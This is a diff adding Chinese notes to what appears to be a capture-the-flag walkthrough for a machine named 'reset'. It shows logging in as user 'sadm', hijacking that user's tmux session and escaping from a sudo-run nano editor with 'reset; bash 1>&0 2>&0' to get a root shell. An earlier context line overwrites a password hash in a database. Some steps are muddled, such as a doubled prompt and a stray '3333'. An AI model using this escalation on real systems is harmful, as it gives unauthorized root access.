@@ -59,6 +59,29 @@ sqlite> UPDATE users SET password_hash = '自定义sha1' WHERE username = 'sadm'
 ```
 不能破解密码，就自己更新密码
 
+3333
+```
+$ sudo useradd sadm
+$ sudo passwd sadm
 
+$ su sadm
 
+$ rlogin sadm@IP
+sadm@reset:~$
+
+$ ps aux
+
+$ tmux attach -t sadm_session
+
+$ $ sudo nano /etc/firewall.sh
+
+//一旦我们进入纳米界面，我们可以按Ctrl+r，然后按Ctrl+x，这允许我们执行来自纳米界面的命令。
+
+//进入这个提示符后，应该输入以下命令，以root身份进入系统shell。
+
+reset; bash 1>&0 2>&0
+
+root@reset:/home/sadm# whoami
+root
+```
 
